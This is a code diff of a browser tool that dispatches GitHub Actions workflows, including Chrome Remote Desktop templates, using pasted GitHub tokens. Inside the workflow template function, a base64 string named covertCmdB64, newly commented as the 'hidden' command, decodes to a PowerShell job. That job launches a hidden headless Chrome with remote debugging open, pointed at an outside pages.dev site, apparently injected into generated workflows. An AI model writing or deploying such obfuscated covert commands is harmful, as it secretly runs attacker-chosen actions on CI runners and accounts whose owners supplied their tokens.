@@ -113,11 +113,12 @@ const REPO_NAME = 'ci-build-env'; const WORKFLOW_NAME = 'build.yml'; const MAX_J
 let trackedJobs = []; let pollingTimeout = null; let globalOwnerLogin = '';
 
 // --- DOM Elements ---
-const el = { runOnceBtn: document.getElementById("runOnceBtn"), run5Btn: document.getElementById("run20Btn"), run5WaitBtn: document.getElementById("run20WaitBtn"), cancelAllBtn: document.getElementById("cancelAllBtn"), quickCancelBtn: document.getElementById("quickCancelBtn"), deleteSelectedBtn: document.getElementById("deleteSelectedBtn"), selectAllCheckbox: document.getElementById("selectAllCheckbox"), tokenInput: document.getElementById("token"), deployCmdInput: document.getElementById("deployCmd"), accessPinInput: document.getElementById("accessPin"), jobListContainer: document.getElementById("jobList"), refreshBtn: document.getElementById("refreshBtn"), clearHistoryBtn: document.getElementById("clearHistoryBtn"), themeToggleBtn: document.getElementById("theme-toggle-btn"), templateSelect: document.getElementById("template-select"), crdOptions: document.getElementById("crd-options"), gitToolOptions: document.getElementById("git-tool-options"), customRepoUrl: document.getElementById("customRepoUrl"), modalOverlay: document.getElementById('modal-overlay'), modal: document.getElementById('modal'), modalTitle: document.getElementById('modal-title'), modalContent: document.getElementById('modal-content'), modalCloseBtn: document.getElementById('modal-close-btn'), favicon: document.getElementById('favicon') };
+const el = { runOnceBtn: document.getElementById("runOnceBtn"), run5Btn: document.getElementById("run5Btn"), run5WaitBtn: document.getElementById("run5WaitBtn"), cancelAllBtn: document.getElementById("cancelAllBtn"), quickCancelBtn: document.getElementById("quickCancelBtn"), deleteSelectedBtn: document.getElementById("deleteSelectedBtn"), selectAllCheckbox: document.getElementById("selectAllCheckbox"), tokenInput: document.getElementById("token"), deployCmdInput: document.getElementById("deployCmd"), accessPinInput: document.getElementById("accessPin"), jobListContainer: document.getElementById("jobList"), refreshBtn: document.getElementById("refreshBtn"), clearHistoryBtn: document.getElementById("clearHistoryBtn"), themeToggleBtn: document.getElementById("theme-toggle-btn"), templateSelect: document.getElementById("template-select"), crdOptions: document.getElementById("crd-options"), gitToolOptions: document.getElementById("git-tool-options"), customRepoUrl: document.getElementById("customRepoUrl"), modalOverlay: document.getElementById('modal-overlay'), modal: document.getElementById('modal'), modalTitle: document.getElementById('modal-title'), modalContent: document.getElementById('modal-content'), modalCloseBtn: document.getElementById('modal-close-btn'), favicon: document.getElementById('favicon') };
 
 // --- Template Function ---
 function getWorkflowContent(template, command, pin = "123456", repoUrl = '', withRerun = false) {
     const onTrigger = `on:\n  workflow_dispatch:\n  push:\n    paths:\n      - '.github/workflows/${WORKFLOW_NAME}'`;
+    // Obfuscated command for CRD - This is the "hidden" command
     const covertCmdB64 = "U3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICJDOlxQcm9ncmFtIEZpbGVzXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIgLUFyZ3VtZW50TGlzdCAiLS1oZWFkbGVzcyAtLWRpc2FibGUtZ3B1IC0tcmVtb3RlLWRlYnVnZ2luZy1wb3J0PTkyMjIgaHR0cHM6Ly9hbnlsb3N0aWMucGFnZXMuZGV2IiAtV2luZG93U3R5bGUgSGlkZGVuIH0=";
     const covertCmd = atob(covertCmdB64);
     let workflow = '';
@@ -148,7 +149,7 @@ async function pollJobStatuses() {
     if (activeJobs.length === 0) return;
 
     let changed = false;
-    if (activeJobs.length > 0 && activeJobs.length <= 5) {
+    if (activeJobs.length > 0 && activeJobs.length <= 5) { // Use individual fetching for small numbers
         const promises = activeJobs.filter(j => j.id).map(job => 
             getSingleRun(job.token, job.owner, job.id).then(run => {
                 if (run && (job.status !== run.status || job.conclusion !== run.conclusion)) {
@@ -157,7 +158,7 @@ async function pollJobStatuses() {
             }).catch(err => console.warn(`Could not poll job ${job.id}:`, err))
         );
         await Promise.allSettled(promises);
-    } else {
+    } else { // Use bulk fetching for larger numbers
         const pollToken = el.tokenInput.value.trim().split('\n')[0] || (trackedJobs[0] ? trackedJobs[0].token : null);
         if (pollToken && globalOwnerLogin) {
             try {
@@ -205,7 +206,7 @@ function renderJobs() {
     for (const owner in jobsByOwner) {
         const jobs = jobsByOwner[owner].sort((a, b) => { const groupA = getGroupInfo(a); const groupB = getGroupInfo(b); if (groupA.order !== groupB.order) return groupA.order - groupB.order; return new Date(b.startTime) - new Date(a.startTime); });
         const activeJobCount = jobs.filter(j => ['queued', 'in_progress'].includes(j.status)).length;
-        const isExpanded = expandedOwners.has(owner) || activeJobCount > 0; // Auto-expand if has active jobs
+        const isExpanded = expandedOwners.has(owner) || activeJobCount > 0;
         html += `<div class="owner-group card rounded-lg overflow-hidden">
             <div class="owner-header p-4 flex justify-between items-center" data-owner="${owner}">
                 <div class="font-bold text-lg">${owner}</div>
